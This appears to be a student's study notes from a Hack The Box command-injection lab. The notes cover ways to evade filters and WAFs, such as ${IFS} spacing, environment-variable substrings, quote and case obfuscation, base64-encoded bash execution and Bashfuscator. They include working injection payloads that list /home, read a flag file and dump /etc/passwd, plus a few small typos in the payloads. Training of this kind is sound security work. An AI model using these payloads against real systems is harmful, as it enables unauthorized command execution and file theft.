# Filter Evasion

## Filter/WAF Detection

We can see that if we try the previous operators we tested, like (`;`, `&&`, `||`), we get the error message `invalid input`:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

&#x20;`If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`.

```bash
127.0.0.1; whoami
```

### Identifying Blacklisted Character

We know that the (`127.0.0.1`) payload does work, so let us start by adding the semi-colon (`127.0.0.1;`):

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Bypassing Space Filters and Spaces

### **Using Tabs**

Using tabs (%09) as both Linux and Windows accept commands with tabs between arguments. So, let us try to use a tab instead of the space character (`127.0.0.1%0a%09`) and see if our request is accepted:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Using $IFS**

Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab. So, if we use `${IFS}` where the spaces should be, the variable should be automatically replaced with a space, and our command should work.

Let us use `${IFS}` and see if it works (`127.0.0.1%0a${IFS}`):

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Using Brace Expansion**

```shell-session
eldeim@htb[/htb]$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

By using brace expansion on our command arguments, like (`127.0.0.1%0a{ls,-la}`). To discover more space filter bypasses, check out the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces.

## Bypassing Other Blacklisted Characters

### Linux

#### **Get a slash (`/`):**

```bash
${PATH:0:1}
```

* The `$PATH` variable usually starts with `/`, e.g., `/usr/local/bin:/usr/bin:/bin`.
* So `${PATH:0:1}` extracts the **first character**, which is `/`.

***

#### &#x20;**Get a semi-colon (`;`):**

```bash
${LS_COLORS:10:1}
```

* The `$LS_COLORS` variable often includes formatting values like `di=01;34:`, and the `;` appears early in the string.
* So this substring gives you a `;`.

***

#### **Get a space:**

```bash
${IFS}
```

* `${IFS}` stands for **Internal Field Separator**.
* By default, this is a **space** in Bash.

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### PoCs - Questions

Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?

In this case, first we need identificate the command injection, we need try all simple and encoder characters -->

{% embed url="https://app.gitbook.com/o/ASYFlzT9juOjRPrhL5PH/s/SrcwXlKGkwhzbrKa8vLU/~/changes/120/htb-cbbh/command-injections/exploitation" %}

The I can see, with the character "%0a" == New Line == \n with out encode, the peticion found

<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Now we need go to the /home directory, we can do it out too methods

#### Method 1 -  Path Traversal:

The with "&0a" we can put a command, for example, "ls" and it print the current directory, and we can too write anothers metods for do a path traversal, the objective is to make == "ls ../../../home" but it, block the backend. We can use operators:

```
echo ${IFS} == SPACE
echo ${PATH:0:1}
/
```

<pre><code><strong>ip=127.0.0.1%0als${IFS}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}home
</strong></code></pre>

#### Method 3 - Command Ejecution

We can use a similar method with too ${PWD:0:1}

```
ip=127.0.0.1%0als${IFS}-la${IFS}${PWD:0:1}home
```

## Bypassing Blacklisted Commands

### Commands Blacklist

A basic command blacklist filter in `PHP` would look like the following:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

### Linux & Windows

if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:

```shell-session
1y4d@htb[/htb]$ w'h'o'am'i
21y4d

21y4d@htb[/htb]$ w"h"o"am"i
21y4d

who$@ami
w\ho\am\i
```

The important things to remember are that `we cannot mix types of quotes` and `the number of quotes must be even`. We can try one of the above in our payload (`127.0.0.1%0aw'h'o'am'i`) and see if it works:

<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

### Windows Only

```cmd-session
C:\htb> who^ami
21y4d
```

### PoCs - Questions

Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.

Use the begains techniques, we can found the flag.txt into the 1nj3c70r directory:

```
127.0.0.1%0als${IFS}-la${IFS}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}home${PATH:0:1}1nj3c70r
```

Now, we need only read it -->

```
ip=127.0.0.1%0a'c''a''t'${IFS}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

## Advanced Command Obfuscation

### Case Manipulation

```shell-session
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
21y4d
## Once we replace the spaces with tabs (%09), we see that the command works perfectly
21y4d@htb[/htb]$ $(tr%09"[A-Z]"%29"[a-z]"<<<"WhOaMi")
### Others
$(a="WhOaMi";printf %s "${a,,}")
```

<figure><img src="../../../.gitbook/assets/image (23) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Reversed Commands

```
21y4d@htb[/htb]$ $(rev<<<'imaohw')
21y4d
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Encoded Commands

```
## First encode the command
echo -n 'cat /etc/passwd | grep 33' | base64
## End Query
bash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

> Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Evasion Tools

{% embed url="https://github.com/Bashfuscator/Bashfuscator" %}

```
eldeim@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
eldeim@htb[/htb]$ cd Bashfuscator
eldeim@htb[/htb]$ pip3 install setuptools==65
eldeim@htb[/htb]$ python3 setup.py install --user
```

```
eldeim@htb[/htb]$ cd ./bashfuscator/bin/
eldeim@htb[/htb]$ ./bashfuscator -h

usage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...
```

We can start by simply providing the command we want to obfuscate with the `-c` flag:

```shell-session
eldeim@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

### PoCs - Questions

Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1

```
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

> We need encode first the payload: `echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64` then, use the malicuos payload and add into spaces `%09`

